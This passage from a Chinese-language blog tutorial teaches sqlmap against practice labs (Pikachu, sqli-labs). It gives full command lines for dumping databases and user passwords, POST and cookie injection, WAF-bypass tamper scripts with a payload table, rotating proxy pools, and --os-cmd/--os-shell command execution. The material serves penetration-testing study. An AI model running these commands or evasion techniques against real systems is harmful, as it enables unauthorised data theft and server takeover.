"http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109160425714.png" alt="image-20211109160425714"></p><h3 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h3><p>获取表之前我们需要指定数据库，根据库列出表</p><p>-D 库名 指定数据库</p><p>–tables 列出所有表</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109160639868.png" alt="image-20211109160639868"></p><h3 id="获取表的字段"><a href="#获取表的字段" class="headerlink" title="获取表的字段"></a>获取表的字段</h3><p>获取字段之前需要指定库名、表名</p><p>-T 表明 指定表</p><p>–columns 列出所有字段</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu -T users --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109160904975.png" alt="image-20211109160904975"></p><p>也可获取某个库中所有表的字段</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu --tables --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109161016475.png" alt="image-20211109161016475"></p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>–dump 是导出数据所有内容</p><p>–dump -C “username,password” 获取某些字段的内容</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu -T users --columns --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>非交互模式下使用的是自带的字典，也可设置字典</p><p><img src="/2021/11/09/day33/image-20211109161325611.png" alt="image-20211109161325611"></p><h3 id="获取指定条数"><a href="#获取指定条数" class="headerlink" title="获取指定条数"></a>获取指定条数</h3><p>获取总条数</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu -T users  --count<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109161829802.png" alt="image-20211109161829802"></p><p>获取指定条数  获取1-3条数的数据</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu -T users  --dump --start 1 --stop 3 --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109161729973.png" alt="image-20211109161729973"></p><h3 id="删除缓存文件"><a href="#删除缓存文件" class="headerlink" title="删除缓存文件"></a>删除缓存文件</h3><p>参数：–flush-session</p><p>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。</p><h3 id="安全的删除output目录的文件"><a href="#安全的删除output目录的文件" class="headerlink" title="安全的删除output目录的文件"></a>安全的删除output目录的文件</h3><p>参数：–purge-output</p><p>有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p><h2 id="实战二"><a href="#实战二" class="headerlink" title="实战二"></a>实战二</h2><p>实战中用的最多的技巧</p><h3 id="–technique-使用指定的注入方式"><a href="#–technique-使用指定的注入方式" class="headerlink" title="–technique 使用指定的注入方式"></a>–technique 使用指定的注入方式</h3><p>在一些实战项目中，难免会遇上 网络反应缓慢，idc还有检测sqlmap的能力，所以作为一个专业的渗透测试人员，必须做到快准狠。</p><p>有些SQL注入点 只允许时间注入，这时指定SQLMAP的注入类型为T</p><p>以下是–technique 参数的值的解释</p><pre class="line-numbers language-none"><code class="language-none">B:Boolean-basedblindSQLinjection（布尔型注入）E:Error-basedSQLinjection（报错型注入）U:UNIONquerySQLinjection（可联合查询注入）S:StackedqueriesSQLinjection（可多语句查询注入）T:Time-basedblindSQLinjection（基于时间延迟注入）Q:InlineSQLInjection(内联注入)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用基于时间的延时注入</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 3 -D pikachu -technique T<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认是全部</p><p>–time-sec 使用时间注入时，设置延时的返回时间，默认是五秒</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 5 -D pikachu -technique T --random-agent --time-sec=6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置超时时间</p><p>–time-out 这个参数是设置超时时间 有得网页响应比较慢，可以使用这个参数来增大访问超时的时间。默认是30</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 5 -D pikachu -technique T --random-agent --timeout=10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–random-agent 指定使用随机的HTTP user-agent</p><p>信息详细为5回显示user-agent头</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 5 -D pikachu -technique T --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109162915629.png" alt="image-20211109162915629"></p><h3 id="读取文本进行测试"><a href="#读取文本进行测试" class="headerlink" title="读取文本进行测试"></a>读取文本进行测试</h3><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -r 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109163851223.png" alt="image-20211109163851223"></p><p><img src="/2021/11/09/day33/image-20211109163910711.png" alt="image-20211109163910711"></p><p>可以看到吧bp的包放到文件里也成功出结果了</p><h3 id="指定参数进行注入"><a href="#指定参数进行注入" class="headerlink" title="指定参数进行注入"></a>指定参数进行注入</h3><p>-p 指定需要测试的参数</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -p name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显然submit不是我们需要测试的参数，本着快准狠的原则指定name为测试参数</p><p>如果url是伪静态的时 ，可以使用*号表示这是检测的地方</p><blockquote><p>从 URL 结构以及页面名称看，伪静态和 静态页面 是一样的。伪静态的页面后缀可以是 html htm 或者是目录格式. </p><p>伪静态只是改变了URL的表现形式，实际上还是 动态页面.。静态页面可以节省服务器资源，而伪静态严格说是增加服务器资源消耗的。</p><p>总结，在 SEO 方面，伪静态和 静态页面 的功能是相同的，但是伪静态本质上还是动态页面，所以消耗资源是和动态页面一样的，而且因为 Rewrite 服务器还需要消耗额外的资源。.</p></blockquote><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "10.163.193.76/06/vul/sqli/id/1*.html"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里1就是告诉sqlmap的监测点</p><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p><img src="/2021/11/09/day33/image-20211109165023125.png" alt="image-20211109165023125"></p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_id.php" --data "id=1&amp;submit=%E6%9F%A5%E8%AF%A2" -p id -v 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也能正常出结果</p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>–cookie 输入cookie的请求参数</p><p>–level 2或者以上才进行cookie注入</p><p>sqllilabs的less21是cookie注入</p><p><img src="/2021/11/09/day33/image-20211109170221436.png" alt="image-20211109170221436"></p><p>我们很自然想到uname作为测试点</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://sql/Less-21/index.php" --cookie "uname = YWRtaW4" -p uname --level 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实战三"><a href="#实战三" class="headerlink" title="实战三"></a>实战三</h2><h3 id="修改最大线程"><a href="#修改最大线程" class="headerlink" title="修改最大线程"></a>修改最大线程</h3><p>lib/core/settings.py </p><p>默认最大线程是10 可以设置线程最大为100</p><pre class="line-numbers language-none"><code class="language-none">MAX_NUMBER_OF_THREADS = 100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110151137355.png" alt="image-20211110151137355"></p><h3 id="修改默认浏览器"><a href="#修改默认浏览器" class="headerlink" title="修改默认浏览器"></a>修改默认浏览器</h3><p><img src="/2021/11/09/day33/image-20211110151417680.png" alt="image-20211110151417680"></p><h2 id="实战四-绕过防火墙"><a href="#实战四-绕过防火墙" class="headerlink" title="实战四 绕过防火墙"></a>实战四 绕过防火墙</h2><p>目前很多网站都使用waf对网站进行保护，在渗透测试过程中，很多的操作都会被拦截，在测试SQL注入时，waf会对请求过来的流量进行拦截，导致SQLMAP请求的内容无法到达目标，SQLMAP无法判断目标是否存在注入，waf对恶意的攻击请求进行拦截，拦截会拉入黑名单，导致攻击者访问不到目标。无法进行安全检测。</p><p>sqlmap存在tamper模块，我们使用–tamper命令选择合适的脚本绕过waf</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -p name --tamper "space2comment.py" -v 3 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>宽字节注入</p><p>unmagicquotes.py</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -p name --tamper "unmagicquotes.py" -v 3 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64注入</p><p>base64encode.py</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.0.136:7766/Less-21/index.php" --cookie="uname=YWRtaW4%3D; PHPSESSID=0roc9e02hrro7nefi1jiuvukq5" --param-del=";"  --dbms mysql --tamper "base64encode.py" -v 4 --level 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–param-del=”;”  用;分割参数</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.0.136:7766/Less-21/index.php" --cookie="uname=YWRtaW4%3D; PHPSESSID=0roc9e02hrro7nefi1jiuvukq5" --param-del=";"  --dbms mysql --tamper "base64encode.py" -v 4 --level 3 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="tampter模块列表"><a href="#tampter模块列表" class="headerlink" title="tampter模块列表"></a>tampter模块列表</h3><p>sqlmap –list-tampers</p><table><thead><tr><th align="left">支持的数据库</th><th>编号</th><th>脚本名称</th><th>作用</th><th>实现方式</th></tr></thead><tbody><tr><td align="left">all</td><td>1</td><td>apostrophemask.py</td><td>用utf8代替引号</td><td>(“1 AND ‘1’=’1”)   ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’</td></tr><tr><td align="left">2</td><td>base64encode.py</td><td>用base64编码替换</td><td>(“1’ AND SLEEP(5)#”)  ‘MScgQU5EIFNMRUVQKDUpIw==’</td><td></td></tr><tr><td align="left">3</td><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td><td>(‘1 UNION SELECT foobar’)  ‘1  UNION   SELECT  foobar’</td><td></td></tr><tr><td align="left">4</td><td>space2plus.py</td><td>用+替换空格</td><td>(‘SELECT id FROM users’)  ‘SELECT+id+FROM+users’</td><td></td></tr><tr><td align="left">5</td><td>nonrecursivereplacement.py</td><td>双重查询语句。取代predefined SQL关键字with表示   suitable for替代（例如 .replace（“SELECT”、””)） filters</td><td>(‘1 UNION SELECT 2–’)  ‘1 UNIOUNIONN SELESELECTCT 2–’</td><td></td></tr><tr><td align="left">6</td><td>space2randomblank.py</td><td>代替空格字符（“”）从一个随机的空  白字符可选字符的有效集</td><td>(‘SELECT id FROM users’)  ‘SELECT%0Did%0DFROM%0Ausers’</td><td></td></tr><tr><td align="left">7</td><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td><td>(‘-1 UNION ALL SELECT’)  ‘-1 UNION SELECT’</td><td></td></tr><tr><td align="left">8</td><td>securesphere.py</td><td>追加特制的字符串</td><td>(‘1 AND 1=1’)  “1 AND 1=1 and ‘0having’=’0having’”</td><td></td></tr><tr><td align="left">mssql</td><td>1</td><td>space2hash.py</td><td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td><td>‘1 AND 9227=9227’   ‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’</td></tr><tr><td align="left">2</td><td>equaltolike.py</td><td>like 代替等号</td><td>* Input: SELECT * FROM users WHERE id=1   2 * Output: SELECT * FROM users WHERE id LIKE 1</td><td></td></tr><tr><td align="left">3</td><td>space2mssqlblank.py(mssql)</td><td>空格替换为其它空符号</td><td>Input: SELECT id FROM users  Output: SELECT%08id%02FROM%0Fusers</td><td></td></tr><tr><td align="left">4</td><td>space2mssqlhash.py</td><td>替换空格</td><td>(‘1 AND 9227=9227’)  ‘1%23%0AAND%23%0A9227=9227’</td><td></td></tr><tr><td align="left">5</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)  ‘1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td align="left">6</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE  * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td align="left">7</td><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td><td>(‘1 AND 9227=9227– ‘)  ‘1 AND 9227=9227– sp_password’</td><td></td></tr><tr><td align="left">8</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE  * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td align="left">9</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT  * Output: InsERt</td><td></td></tr><tr><td align="left">10</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE   * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td align="left">11</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users  * Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td align="left">mysql &gt;= 5.1.13</td><td>1</td><td>equaltolike.py</td><td>like 代替等号</td><td>* Input: SELECT * FROM users WHERE id=1   2 * Output: SELECT * FROM users WHERE id LIKE 1</td></tr><tr><td align="left">2</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)  ‘1 AND GREATEST(A,B+1)=A’</td><td></td></tr><tr><td align="left">3</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”)    ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td align="left">4</td><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。  替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td><td>(‘IFNULL(1, 2)’)  ‘IF(ISNULL(1),2,1)’</td><td></td></tr><tr><td align="left">5</td><td>space2mssqlhash.py</td><td>替换空格</td><td>(‘1 AND 9227=9227’)  ‘1%23%0AAND%23%0A9227=9227’</td><td></td></tr><tr><td align="left">6</td><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td><td>(‘1 AND 2&gt;1–’)  ‘1 /<em>!30874AND 2&gt;1</em>/–’</td><td></td></tr><tr><td align="left">7</td><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td><td>Input: SELECT id FROM users  Output: SELECT%0Bid%0BFROM%A0users</td><td></td></tr><tr><td align="left">8</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)  ‘1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td align="left">9</td><td>modsecurityzeroversioned.py</td><td>包含了完整的查询与零版本注释</td><td>(‘1 AND 2&gt;1–’)  ‘1 /<em>!00000AND 2&gt;1</em>/–’</td><td></td></tr><tr><td align="left">10</td><td>space2mysqldash.py</td><td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td><td>(‘1 AND 9227=9227’)  ‘1–%0AAND–%0A9227=9227’</td><td></td></tr><tr><td align="left">11</td><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。  然后替换=为like</td><td>(‘SELECT id FROM users where id = 1’)  ‘SELECT%09id FROM users where id LIKE 1’</td><td></td></tr><tr><td align="left">12</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE  * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td align="left">13</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE  * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td align="left">14</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT  * Output: InsERt</td><td></td></tr><tr><td align="left">15</td><td>versionedkeywords.py</td><td>Encloses each non-function keyword with versioned MySQL comment</td><td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#   * Output: 1/<em>!UNION</em><em>!ALL</em><em>!SELECT</em><em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em><em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</td><td></td></tr><tr><td align="left">16</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users  * Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td align="left">17</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE   * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td align="left">18</td><td>versionedmorekeywords.py</td><td>注释绕过</td><td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#   * Output: 1/<em>!UNION</em><em>!ALL</em><em>!SELECT</em><em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em><em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</td><td></td></tr><tr><td align="left">MySQL &lt; 5.1</td><td>19</td><td>halfversionedmorekeywords.py</td><td>关键字前加注释</td><td>* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa   * Output: value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa</td></tr><tr><td align="left">20</td><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加  mysql版本评论</td><td>1.(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)   2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”</td><td></td></tr><tr><td align="left">MySQL &gt;= 5.1.13</td><td>21</td><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td><td>* Input: 1 AND 9227=9227  * Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td></tr><tr><td align="left">Oracle</td><td>1</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)  ‘1 AND GREATEST(A,B+1)=A’</td></tr><tr><td align="left">2</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”)    ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td align="left">3</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)  ‘1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td align="left">4</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE  * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td align="left">5</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT  * Output: InsERt</td><td></td></tr><tr><td align="left">6</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE   * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td align="left">7</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users  * Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td align="left">PostgreSQL</td><td>1</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)  ‘1 AND GREATEST(A,B+1)=A’</td></tr><tr><td align="left">2</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”)    ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td align="left">3</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)  ‘1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td align="left">4</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE  * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td align="left">5</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE  * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td align="left">6</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT  * Output: InsERt</td><td></td></tr><tr><td align="left">7</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE   * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td align="left">8</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users  * Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td align="left">Access</td><td>1</td><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td><td>(‘1 AND 1=1’)  ‘1 AND 1=1%00’</td></tr><tr><td align="left">其他</td><td></td><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td><td>* Input: SELECT FIELD FROM%20TABLE  * Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td></tr><tr><td align="left"></td><td>unmagicquotes.py</td><td>宽字符绕过 GPC addslashes</td><td>* Input: 1′ AND 1=1  * Output: 1%bf%27 AND 1=1–%20</td><td></td></tr><tr><td align="left"></td><td>randomcomments.py</td><td>用/**/分割sql关键字</td><td>‘INSERT’ becomes ‘IN//S//ERT’</td><td></td></tr></tbody></table><h3 id="设置线程大小"><a href="#设置线程大小" class="headerlink" title="设置线程大小"></a>设置线程大小</h3><p>在遇到waf的时候，如果并发过大，会认为是cc攻击，ip会被封堵</p><p>–threads=1 设置线程为1</p><h3 id="设置http请求延时"><a href="#设置http请求延时" class="headerlink" title="设置http请求延时"></a>设置http请求延时</h3><p>–delay=DELAY       设置每个 HTTP 请求的延迟秒数</p><h3 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h3><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -p name --proxy=http://127.0.0.1:8081<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以在bp上开个端口，让sqlmap的流量经过它</p><p><img src="/2021/11/09/day33/image-20211110202014131.png" alt="image-20211110202014131"></p><p>可以看到下图sqlmap的流量过来了</p><p><img src="/2021/11/09/day33/image-20211110202024557.png" alt="image-20211110202024557"></p><p><img src="/2021/11/09/day33/image-20211110202001149.png" alt="image-20211110202001149"></p><h3 id="使用代理池注入"><a href="#使用代理池注入" class="headerlink" title="使用代理池注入"></a>使用代理池注入</h3><p>购买代理池之后 获取代理 保存到文件内</p><pre class="line-numbers language-none"><code class="language-none">123.73.208.166:46603123.73.63.29:46603123.73.63.84:46603112.123.40.42:40806183.47.94.248:38090121.237.149.88:13804114.99.108.71:23359123.73.209.246:46603123.73.63.132:46603119.55.253.202:39730<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>–proxy-file 从文件中加载代理列表</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.0.136:7766/Less-32/?id=1" --dbms mysql --tamper "unmagicquotes.py" -v 1 --proxy-file=proxy.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实战五-命令执行-文件读写-dns盲注"><a href="#实战五-命令执行-文件读写-dns盲注" class="headerlink" title="实战五 命令执行 文件读写 dns盲注"></a>实战五 命令执行 文件读写 dns盲注</h2><h3 id="sqlmap命令执行"><a href="#sqlmap命令执行" class="headerlink" title="sqlmap命令执行"></a>sqlmap命令执行</h3><p>一般在权限比较高时使用</p><pre><code>--os-cmd=OSCMD      执行操作系统命令--os-shell          调出交互式操作系统 shell</code></pre><p>注入点的当前用户是dba时，使用以上两个命令，一个是执行命令，一个是调用交互操作系统shell</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --os-cmd="net user"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110204445418.png" alt="image-20211110204445418"></p><p>可以看到是SQL server 并且是DBA权限，命令执行成功了</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --os-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 